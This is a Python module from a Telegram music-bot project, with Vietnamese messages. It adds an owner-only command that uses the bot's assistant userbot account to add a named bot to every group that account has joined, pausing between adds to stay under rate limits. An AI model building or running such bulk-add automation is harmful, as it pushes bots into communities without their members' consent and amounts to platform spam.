import asyncio

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
OWNERS = "6337933296"
from SANKIXD import app
from SANKIXD.utils.database import add_served_chat, get_assistant


@app.on_message(filters.command("gadd") & filters.user(int(OWNERS)))
async def add_allbot(client, message):
    command_parts = message.text.split(" ")
    if len(command_parts) != 2:
        await message.reply(
            "**⚠️ Lệnh không hợp lệ. Vui lòng sử dụng giống như » `/gadd @muoimuoiamnhac_Bot`**"
        )
        return

    bot_username = command_parts[1]
    try:
        userbot = await get_assistant(message.chat.id)
        bot = await app.get_users(bot_username)
        app_id = bot.id
        done = 0
        failed = 0
        lol = await message.reply("🔄 **Thêm bot vào tất cả các nhóm!**")
        await userbot.send_message(bot_username, f"/start")
        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == -1001816641523:
                continue
            try:

                await userbot.add_chat_members(dialog.chat.id, app_id)
                done += 1
                await lol.edit(
                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ Đã thêm vào {done} nhóm ✅**\n**➥ Đã thất bại trong {failed} nhóm ❌**\n\n**➲ Đã thêm bởi»** @{userbot.username}"
                )
            except Exception as e:
                failed += 1
                await lol.edit(
                    f"**🔂 Thêm {bot_username}**\n\n**➥ Đã thêm vào{done} nhóm ✅**\n**➥ Đã thất bại trong {failed} nhóm ❌**\n\n**➲ Thêm bởi»** @{userbot.username}"
                )
            await asyncio.sleep(3)  # Adjust sleep time based on rate limits

        await lol.edit(
            f"**➻ {bot_username} bot đã được thêm thành công🎉**\n\n**➥ Đã thêm vào {done} nhóm ✅**\n**➥ Đã thất bại trong {failed} nhóm ❌**\n\n**➲ Thêm bởi»** @{userbot.username}"
        )
    except Exception as e:
        await message.reply(f"Lỗi: {str(e)}")
